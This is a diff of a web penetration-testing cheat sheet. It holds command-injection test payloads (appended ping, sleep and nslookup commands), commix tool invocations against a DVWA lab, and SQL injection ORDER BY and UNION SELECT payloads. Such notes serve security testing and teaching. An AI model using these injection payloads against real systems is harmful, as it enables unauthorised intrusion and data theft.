@@ -12,8 +12,6 @@ Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br>
 Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
 Test Blind Sleep: | <code> http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10 </code>
 Commix | <code> commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" </code>
-Commix 2 | <code> python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4" </code>
-
 
 > **Exploit Command Injection**
 
@@ -147,9 +145,11 @@ Columns | column_name FROM all_tab_columns
 
 Once you have identified SQL injection, use order by (increase until it breaks):
 {% highlight sql %}
+dent' and 'a'='a' ORDER BY 1; #
+...
 dent' and 'a'='a' ORDER BY 5; #
 {% endhighlight %}
- See which numbers are visable in the output. 
+ See which fields (e.g., numbers) are visable in the output. 
 {% highlight sql %}
 Dent' UNION SELECT  '1', '2', '3', '4'; #
 {% endhighlight %}
